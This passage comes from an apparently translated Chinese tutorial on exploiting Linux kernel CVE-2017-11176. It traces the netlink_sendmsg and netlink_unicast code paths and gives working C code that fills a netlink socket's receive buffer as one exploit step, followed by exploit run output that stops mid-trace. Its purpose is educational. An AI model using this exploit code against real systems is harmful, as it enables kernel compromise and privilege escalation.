<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> &#123;</span></span><br><span class="line">   <span class="keyword">void</span>         *msg_name;       <span class="comment">/* optional address */</span></span><br><span class="line">   <span class="keyword">socklen_t</span>     msg_namelen;    <span class="comment">/* size of address */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">msg_iov</span>;</span>        <span class="comment">/* scatter/gather array */</span></span><br><span class="line">   <span class="keyword">size_t</span>        msg_iovlen;     <span class="comment">/* # elements in msg_iov */</span></span><br><span class="line">   <span class="keyword">void</span>         *msg_control;    <span class="comment">/* ancillary data, see below */</span></span><br><span class="line">   <span class="keyword">size_t</span>        msg_controllen; <span class="comment">/* ancillary data buffer len */</span></span><br><span class="line">   <span class="keyword">int</span>           msg_flags;      <span class="comment">/* flags on received message */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> __user     *iov_base;</span><br><span class="line">  <span class="keyword">__kernel_size_t</span> iov_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在本节中，我们将从代码中推断出合适的参数值，并逐步建立我们的“约束”列表。这样做会使内核执行我们想要的路径。内核利用实际上就是这个意思。 这里，对netlink_unicast()的调用位于最后，所以我们需要通过（或跳过）所有检查……</p>
<p>开始吧：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netlink_sendmsg</span><span class="params">(struct kiocb *kiocb, struct socket *sock,</span></span></span><br><span class="line"><span class="function"><span class="params">             struct msghdr *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock_iocb</span> *<span class="title">siocb</span> = <span class="title">kiocb_to_siocb</span>(<span class="title">kiocb</span>);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = <span class="title">nlk_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> *<span class="title">addr</span> = <span class="title">msg</span>-&gt;<span class="title">msg_name</span>;</span></span><br><span class="line">      u32 dst_pid;</span><br><span class="line">      u32 dst_group;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">      <span class="keyword">int</span> err;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">      u32 netlink_skb_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (msg-&gt;msg_flags&amp;MSG_OOB)</span><br><span class="line">        <span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]   <span class="keyword">if</span> (<span class="literal">NULL</span> == siocb-&gt;scm)</span><br><span class="line">        siocb-&gt;scm = &amp;scm;</span><br><span class="line"></span><br><span class="line">      err = scm_send(sock, msg, siocb-&gt;scm, <span class="literal">true</span>);</span><br><span class="line">[<span class="number">2</span>]   <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">      err = netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT);   <span class="comment">// &lt;---- our target</span></span><br><span class="line"></span><br><span class="line">    out:</span><br><span class="line">      scm_destroy(siocb-&gt;scm);</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>标志位<em>MSG_OOB</em>不能被设置以通过[0]处的检查，因此第一个限制条件：<strong>msg-&gt;msg_flags MSG_OOB位为0</strong>。</p>
<p>为了通过[1]处的检查，需要在*<em>__sock_sendmsg_nosec()**中设置siocb-&gt;scm为</em>NULL<em>。最后，</em>scm_send()*不能返回负值。代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __inline__ <span class="keyword">int</span> <span class="title">scm_send</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="function"><span class="params">                   struct scm_cookie *scm, <span class="keyword">bool</span> forcecreds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(scm, <span class="number">0</span>, <span class="keyword">sizeof</span>(*scm));</span><br><span class="line">    <span class="keyword">if</span> (forcecreds)</span><br><span class="line">        scm_set_cred(scm, task_tgid(current), current_cred());</span><br><span class="line">    unix_get_peersec_dgram(sock, scm);</span><br><span class="line">    <span class="keyword">if</span> (msg-&gt;msg_controllen &lt;= <span class="number">0</span>)     <span class="comment">// &lt;----- this need to be true...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                     <span class="comment">// &lt;----- ...so we hit this and skip __scm_send()</span></span><br><span class="line">    <span class="keyword">return</span> __scm_send(sock, msg, scm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，第二个限制条件：<strong>msg-&gt;msg_controllen (size_t) 为0</strong>。继续：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">// ... netlink_sendmsg() continuation ...</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (msg-&gt;msg_namelen) &#123;</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> (addr-&gt;nl_family != AF_NETLINK)</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">[<span class="number">2</span>a]    dst_pid = addr-&gt;nl_pid;</span><br><span class="line">[<span class="number">2b</span>]    dst_group = ffs(addr-&gt;nl_groups);</span><br><span class="line">        err =  -EPERM;</span><br><span class="line">[<span class="number">3</span>]     <span class="keyword">if</span> ((dst_group || dst_pid) &amp;&amp; !netlink_allowed(sock, NL_NONROOT_SEND))</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        netlink_skb_flags |= NETLINK_SKB_DST;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dst_pid = nlk-&gt;dst_pid;</span><br><span class="line">        dst_group = nlk-&gt;dst_group;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut ...</span></span><br></pre></td></tr></table></figure>

<p>好的，这个有点棘手。 此块取决于sender socket是否已连接到目标（receiver）socket。 如果是，则nlk-&gt; dst_pid和nlk-&gt; dst_group都已设置。由于我们不想连接到receiver socket（可能会有副作用），想采取第一个分支，那就要求**msg-&gt;msg_namelen必须不等于零[0]**。</p>
<p>如果我们回过头看函数一开始的地方，我们可以发现addr是另一个我们可以控制的参数：msg-&gt;msg_name。在[2a]和[2b]的帮助下，我们可以任意写入dst_group和dst_pid。控制这些允许我们：</p>
<ol>
<li>dst_group == 0：send a unicast message instead of broadcast (cf. <em>man 7 netlink</em>)</li>
<li>dst_pid != 0：talk to the receiver socket (userland) of our choice. Zero meaning “talk to the kernel” (read the manual!).</li>
</ol>
<p>Which we translate in the constraint list into (msg_name被转为sockaddr_nl):</p>
<ol>
<li><strong>msg-&gt;msg_name-&gt;dst_group为0</strong></li>
<li><strong>msg-&gt;msg_name-&gt;dst_pid等于”destination” socket nl_pid</strong></li>
</ol>
<p>但是，这意味着<strong>netlink_allowed(sock, NL_NONROOT_SEND)</strong> [3]不会返回0：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">netlink_allowed</span><span class="params">(<span class="keyword">const</span> struct socket *sock, <span class="keyword">unsigned</span> <span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (nl_table[sock-&gt;sk-&gt;sk_protocol].flags &amp; flag) || capable(CAP_NET_ADMIN));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为我们不是特权用户，所以没有CAP_NET_ADMIN标记位。唯一拥有NL_NONROOT_SEND标记位的netlink协议是<em>NETLINK_USERSOCK</em>。也就是说，<strong>sender socket必须使用NETLINK_USERSOCK协议</strong>。</p>
<p>另外在[1]中，我们需要 <strong>msg-&gt;msg_name-&gt;nl_family等于AF_NETLINK</strong>。</p>
<p>下一步：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (!nlk-&gt;pid) &#123;</span><br><span class="line">[<span class="number">1</span>]     err = netlink_autobind(sock);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>我们无法控制[0]处的检查，因为在socket创建期间，套接字的pid被设置为零（整个结构由sk_alloc()清零）。但<strong>netlink_autobind()</strong> [1]将为我们的sender socket找到“可用”pid并且它不会失败。在第二次调用sendmsg()时将跳过检查，此时将设置nlk-&gt;pid。下一个：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      err = -EMSGSIZE;</span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (len &gt; sk-&gt;sk_sndbuf - <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      err = -ENOBUFS;</span><br><span class="line">      skb = alloc_skb(len, GFP_KERNEL);</span><br><span class="line">[<span class="number">1</span>]   <span class="keyword">if</span> (skb == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br></pre></td></tr></table></figure>

<p>在这，len在**__sys_sendmsg()**中被计算，这是所有iovec的长度和。所以，所有iovecs的总和必须小于sk-&gt; sk_sndbuf减去32 [0]。为了简单起见，我们将使用单个iovec，就是：</p>
<ul>
<li><strong>msg-&gt;msg_iovlen等于1</strong> // a single iovec</li>
<li><strong>msg-&gt;msg_iov-&gt;iov_len小于等于sk-&gt;sk_sndbuf减去32</strong></li>
<li><strong>msg-&gt;msg_iov-&gt;iov_base需要用户态可读地址</strong> // 否则__sys_sendmsg()会失败</li>
</ul>
<p>最后一个限制是<strong>msg-&gt;msg_iov同样需要用户态可读地址</strong>（否则__sys_sendmsg()会失败）</p>
<p><strong>NOTE</strong>：sk_sndbuf相当于sk_rcvbuf，但对于发送缓冲区，我们可以使用**sock_getsockopt()**选项SO_SNDBUF检索其值。</p>
<p>[1]处的检查几乎不会不通过，如果不通过意味着内核已经用尽了内存。</p>
<p>下一块代码可以忽略（没有通过任何检查的需求），siocb-&gt;scm结构体在scm_send()中初始化：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NETLINK_CB(skb).pid   = nlk-&gt;pid;</span><br><span class="line">NETLINK_CB(skb).dst_group = dst_group;</span><br><span class="line"><span class="built_in">memcpy</span>(NETLINK_CREDS(skb), &amp;siocb-&gt;scm-&gt;creds, <span class="keyword">sizeof</span>(struct ucred));</span><br><span class="line">NETLINK_CB(skb).flags = netlink_skb_flags;</span><br></pre></td></tr></table></figure>

<p>接着：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      err = -EFAULT;</span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (memcpy_fromiovec(skb_put(skb, len), msg-&gt;msg_iov, len)) &#123;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>[0]处同样没有任何问题因为我们已经提供了可读的iovec，除非__sys_sendmsg()调用失败。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>]   err = security_netlink_send(sk, skb);</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>这是LSM的检查。如果我们不能通过这个检查，就需要寻找其它途径到达netlink_unicast()或者另一种增加sk_rmem_alloc的方法（例如尝试netlink_dump()）。我们假设我们通过了这个检查。</p>
<p>最后：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (dst_group) &#123;</span><br><span class="line">        atomic_inc(&amp;skb-&gt;users);</span><br><span class="line">        netlink_broadcast(sk, skb, dst_pid, dst_group, GFP_KERNEL);</span><br><span class="line">      &#125;</span><br><span class="line">[<span class="number">1</span>]   err = netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT);</span><br></pre></td></tr></table></figure>

<p>记住dst_group被赋值为msg-&gt;msg_name-&gt;dst_group。既然我们强制让他为0，我们能够跳过[0]处并最终到达netlink_unicast()。</p>
<p>让我们总结一下从netlink_sendmsg()到达netlink_unicast()的条件：</p>
<ul>
<li><strong>msg-&gt;msg_flags</strong> doesn’t have the <em>MSG_OOB</em> flag</li>
<li><strong>msg-&gt;msg_controllen</strong> equals 0</li>
<li><strong>msg-&gt;msg_namelen</strong> is different from zero</li>
<li><strong>msg-&gt;msg_name-&gt;nl_family</strong> equals AF_NETLINK</li>
<li><strong>msg-&gt;msg_name-&gt;nl_groups</strong> equals 0</li>
<li><strong>msg-&gt;msg_name-&gt;nl_pid</strong> is different from 0 and points to the receiver socket</li>
<li>the sender netlink socket must use the <strong>NETLINK_USERSOCK</strong> protocol</li>
<li><strong>msg-&gt;msg_iovlen</strong> equals 1</li>
<li><strong>msg-&gt;msg_iov</strong> is a readable userland address</li>
<li><strong>msg-&gt;msg_iov-&gt;iov_len</strong> is lesser than or equals to sk_sndbuf minus 32</li>
<li><strong>msg-&gt;msg_iov-&gt;iov_base</strong> is a readable userland address</li>
</ul>
<p>我们在这里看到的是内核开发者的工作。分析每个检查，强制执行特定的内核路径，定制系统调用参数等。实际上，分析这些条件的时间并不长。有些路径比这更复杂。</p>
<p>让我们继续前进，研究如何到达netlink_attachskb()。</p>
<h4 id="Reach-netlink-attachskb-from-netlink-unicast"><a href="#Reach-netlink-attachskb-from-netlink-unicast" class="headerlink" title="Reach netlink_attachskb() from netlink_unicast()"></a>Reach netlink_attachskb() from netlink_unicast()</h4><p>netlink_unicast()有以下参数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sk</strong> is our sender netlink_sock</li>
<li><strong>skb</strong> is a socket buffer filled with <em>msg-&gt;msg_iov-&gt;iov_base</em> data of size <em>msg-&gt;msg_iov-&gt;iov_len</em></li>
<li><strong>dst_pid</strong> is a controlled pid (<em>msg-&gt;msg_name-&gt;nl_pid</em>) pointing to our receiver netlink socket</li>
<li><strong>msg-&gt;msg_flasg&amp;MSG_DONTWAIT</strong> indicates if netlink_unicast() should block or not</li>
</ul>
<p><strong>WARNING</strong>: Inside the netlink_unicast() code <strong>“ssk” is the sender socket and “sk” the receiver</strong>.</p>
<p>netlink_unicast()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_unicast</span><span class="params">(struct sock *ssk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">            u32 pid, <span class="keyword">int</span> nonblock)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line">      <span class="keyword">int</span> err;</span><br><span class="line">      <span class="keyword">long</span> timeo;</span><br><span class="line"></span><br><span class="line">      skb = netlink_trim(skb, gfp_any());   <span class="comment">// &lt;----- ignore this</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   timeo = sock_sndtimeo(ssk, nonblock);</span><br><span class="line">    retry:</span><br><span class="line">[<span class="number">1</span>]   sk = netlink_getsockbypid(ssk, pid);</span><br><span class="line">      <span class="keyword">if</span> (IS_ERR(sk)) &#123;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(sk);</span><br><span class="line">      &#125;</span><br><span class="line">[<span class="number">2</span>]   <span class="keyword">if</span> (netlink_is_kernel(sk))</span><br><span class="line">        <span class="keyword">return</span> netlink_unicast_kernel(sk, skb, ssk);</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]   <span class="keyword">if</span> (sk_filter(sk, skb)) &#123;</span><br><span class="line">        err = skb-&gt;len;</span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">        sock_put(sk);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">4</span>]   err = netlink_attachskb(sk, skb, &amp;timeo, ssk);</span><br><span class="line">      <span class="keyword">if</span> (err == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">      <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>]   <span class="keyword">return</span> netlink_sendskb(sk, skb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>[0]处，sock_sndtimeo()根据<em>nonblock</em>设置<strong>timeo</strong>(<em>timeout</em>)的值。因为我们不想阻塞（nonblock&gt;0），timeo将会是0。所以<strong>msg-&gt;msg_flags必须设置MSG_DONTWAIT标志</strong>。</p>
<p>[1]处，目标netlink_sock “sk”通过pid获取，正如我们将在下一节中看到的那样，在使用netlink_getsockbypid()检索之前，**需要绑定目标netlink_sock **。</p>
<p>[2]处，目标socket必须不是一个内核socket。一个netlink sock如果有<em>NETLINK_KERNEL_SOCKET</em>标志，它将被认为是内核的。这意味着它是通过netlink_kernel_create()函数创建的。不幸的是，NETLINK_GENERIC是他们的其中之一。所以我们<strong>也将receiver socket的协议更改为NETLINK_USERSOCK</strong>。请注意，receiver netlink_sock上有一个引用。（ Note that a reference is taken on receiver netlink_sock）</p>
<p>[3]处，可能会有BPF sock过滤器被应用，如果没有为receiver sock创建任何BPF过滤器，那么这里可以跳过。</p>
<p>It means that it has been created with the netlink_kernel_create() function. Unfortunately, the NETLINK_GENERIC is one of them (from current exploit). So let’s <strong>change the receiver socket protocol to NETLINK_USERSOCK</strong> as well. It also makes more sense by the way… Note that a reference is taken on receiver netlink_sock.</p>
<p>接着就是[4]处调用netlink_attachskb()！在netlink_attachskb()中，我们保证采用其中一条路径：</p>
<ol>
<li>the receiver buffer is not full: call skb_set_owner_r() -&gt; increase sk_rmem_alloc</li>
<li>the receiver buffer is full: netlink_attachskb() do not block and return -EAGAIN (timeout is zero)</li>
</ol>
<p>也就是说，我们有办法知道接收缓冲区何时已满（只需检查sendmsg()的错误代码）。</p>
<p>最后，[5]处调用netlink_sendskb()将skb添加到receiver buffer列表并删除netlink_getsockbypid()的引用。</p>
<p>条件限制：</p>
<ul>
<li><strong>msg-&gt;msg_flags</strong> has the MSG_DONTWAIT flag set</li>
<li>the receiver netlink socket must be bound prior calling sendmsg()</li>
<li>the receiver netlink socket must use the <strong>NETLINK_USERSOCK</strong> protocol</li>
<li>don’t define any BPF filter for the receiver socket</li>
</ul>
<p>我们现在非常接近最终的PoC，我们只需要绑定接收器套接字。</p>
<h4 id="Binding-the-receiver-socket"><a href="#Binding-the-receiver-socket" class="headerlink" title="Binding the receiver socket"></a>Binding the receiver socket</h4><p>与任何socket通信一样，两个socket可以使用“地址”进行通信。由于我们正在操作netlink socket，我们将使用struct sockaddr_nl类型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> &#123;</span></span><br><span class="line">   <span class="keyword">sa_family_t</span>     nl_family;  <span class="comment">/* AF_NETLINK */</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span>  nl_pad;     <span class="comment">/* Zero. */</span></span><br><span class="line">   <span class="keyword">pid_t</span>           nl_pid;     <span class="comment">/* Port ID. */</span></span><br><span class="line">   __u32           nl_groups;  <span class="comment">/* Multicast groups mask. */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于我们不想成为broadcast group的一部分，因此nl_groups必须为零。这里唯一重要的字段是nl_pid。</p>
<p>基本上，**netlink_bind()**有两条路径：</p>
<ol>
<li>nl_pid is not zero: it calls <strong>netlink_insert()</strong></li>
<li>nl_pid is zero: it calls <strong>netlink_autobind()</strong>, which in turn calls netlink_insert()</li>
</ol>
<p>请注意，使用已使用的pid调用netlink_insert()将失败，并显示错误-EADDRINUSE。 否则，在nl_pid和netlink sock之间创建映射。也就是说，现在可以使用netlink_getsockbypid()检索netlink sock。<strong>此外，netlink_insert()将sock引用计数器增加1</strong>。请记住这件事情。</p>
<p>注意：第4部分将详细介绍netlink如何存储“pid:netlink_sock”映射。</p>
<p>虽然调用netlink_autobind()看起来更自然，但我们实际上是通过遍历pid值（这是autobind做的）直到bind()成功。直接设置nl_pid允许我们直接获取目标nl_pid值而不调用getsockname()，并且（可能）简化调试。</p>
<h4 id="Putting-It-All-Together"><a href="#Putting-It-All-Together" class="headerlink" title="Putting It All Together"></a>Putting It All Together</h4><p>分析所有这些路径都需要很长的时间，但是我们现在已经准备好在exploit中实施它并最终实现我们的目标：让<strong>netlink_attachskb()返回1</strong>。</p>
<p>一些策略：</p>
<ol>
<li>使用NETLINK_USERSOCK协议创建两个AF_NETLINK socket</li>
<li>绑定目标（receiver）socket（即必须使其接收缓冲区已满的socket）</li>
<li>[可选]尝试减少目标socket的接收缓冲区（减少对sendmsg()的调用）</li>
<li>通过sender socket中的*sendmsg()*填充目标socket，直到它返回EAGAIN</li>
<li>关闭sender socket（不再需要它了）</li>
</ol>
<p>你可以<em>独立</em>运行以下代码，以验证一切正常：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepare_blocking_socket</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> send_fd;</span><br><span class="line">  <span class="keyword">int</span> recv_fd;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>*<span class="number">10</span>]; <span class="comment">// should be less than (sk-&gt;sk_sndbuf - 32), you can use getsockopt()</span></span><br><span class="line">  <span class="keyword">int</span> new_size = <span class="number">0</span>; <span class="comment">// this will be reset to SOCK_MIN_RCVBUF</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">addr</span> = &#123;</span></span><br><span class="line">    .nl_family = AF_NETLINK,</span><br><span class="line">    .nl_pad = <span class="number">0</span>,</span><br><span class="line">    .nl_pid = <span class="number">118</span>, <span class="comment">// must different than zero</span></span><br><span class="line">    .nl_groups = <span class="number">0</span> <span class="comment">// no groups</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> = &#123;</span></span><br><span class="line">    .iov_base = buf,</span><br><span class="line">    .iov_len = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">mhdr</span> = &#123;</span></span><br><span class="line">    .msg_name = &amp;addr,</span><br><span class="line">    .msg_namelen = <span class="keyword">sizeof</span>(addr),</span><br><span class="line">    .msg_iov = &amp;iov,</span><br><span class="line">    .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    .msg_control = <span class="literal">NULL</span>,</span><br><span class="line">    .msg_controllen = <span class="number">0</span>,</span><br><span class="line">    .msg_flags = <span class="number">0</span>, </span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] preparing blocking netlink socket\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span> ||</span><br><span class="line">      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] socket created (send_fd = %d, recv_fd = %d)\n&quot;</span>, send_fd, recv_fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// simulate netlink_autobind()</span></span><br><span class="line">  <span class="keyword">while</span> (_bind(recv_fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno != EADDRINUSE)</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] bind&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    addr.nl_pid++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink socket bound (nl_pid=%d)\n&quot;</span>, addr.nl_pid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &amp;new_size, <span class="keyword">sizeof</span>(new_size)))</span><br><span class="line">    perror(<span class="string">&quot;[-] setsockopt&quot;</span>); <span class="comment">// no worry if it fails, it is just an optim.</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] receive buffer reduced\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] flooding socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (_sendmsg(send_fd, &amp;mhdr, MSG_DONTWAIT) &gt; <span class="number">0</span>)  <span class="comment">// &lt;----- don&#x27;t forget MSG_DONTWAIT</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> (errno != EAGAIN)  <span class="comment">// &lt;----- did we failed because the receive buffer is full ?</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sendmsg&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] flood completed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  _close(send_fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] blocking socket ready\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> recv_fd;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to prepare block socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们来看一下System Tap的返回结果。<strong>从这里开始，System Tap仅用来观察内核且不修改任何数据</strong>。输出结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunichi@debian:/mnt/hgfs/Ubuntu For Debug/cve$ ./exploit</span><br><span class="line">[ ] -=&#123; CVE-2017-11176 Exploit &#125;=-</span><br><span class="line">[ ] preparing blocking netlink socket</span><br><span class="line">[+] socket created (send_fd = 3, recv_fd = 4)</span><br><span class="line">[+] netlink socket bound (nl_pid=118)</span><br><span class="line">[+] receive buffer reduced</span><br><span class="line">[ ] flooding socket</span><br><span class="line">[+] flood completed</span><br><span class="line">[+] blocking socket ready</span><br><span class="line">[+] netlink socket created = 4</span><br><span class="line">[+] netlink fd duplicated (unblock_fd=3, sock_fd2=5)</span><br><span class="line">[ ] creating unblock thread...</span><br><span class="line">[+] unblocking thread has been created!</span><br><span class="line">[ ] get ready to block</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7200)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8300)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c746d40)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0x0)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c980500)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da100</span><br><span class="line">(1370-1370) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(1370-1370) &gt;&gt;&gt; fget (fd=0x3)</span><br><span class="line">(1370-1370) 